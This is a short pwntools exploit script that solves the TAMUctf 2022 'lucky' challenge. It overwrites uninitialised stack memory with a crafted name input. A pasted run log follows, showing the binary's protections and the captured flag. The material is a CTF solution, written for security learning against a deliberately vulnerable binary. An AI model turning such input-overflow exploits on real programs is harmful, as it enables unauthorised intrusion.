from pwn import *

context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './lucky'
context.binary = elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  s = remote("tamuctf.com", 443, ssl=True, sni="lucky")
else:
  s = process(BINARY)

s.recvuntil("Enter your name: ")
buf = "A"*12+"\x12\x34\x56"
s.sendline(buf)

s.interactive()

'''
mito@ubuntu:~/CTF/TAMUctf_2022/Pwn_Lucky$ python3 solve.py r
[*] '/home/mito/CTF/TAMUctf_2022/Pwn_Lucky/lucky'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to tamuctf.com on port 443: Done
solve.py:14: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  s.recvuntil("Enter your name: ")
solve.py:16: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  s.sendline(buf)
[*] Switching to interactive mode

Welcome, AAAAAAAAAAAA\x12V
If you're super lucky, you might get a flag! GLHF :D
Nice work! Here's the flag: gigem{un1n1t14l1z3d_m3m0ry_15_r4nd0m_r1ght}
'''
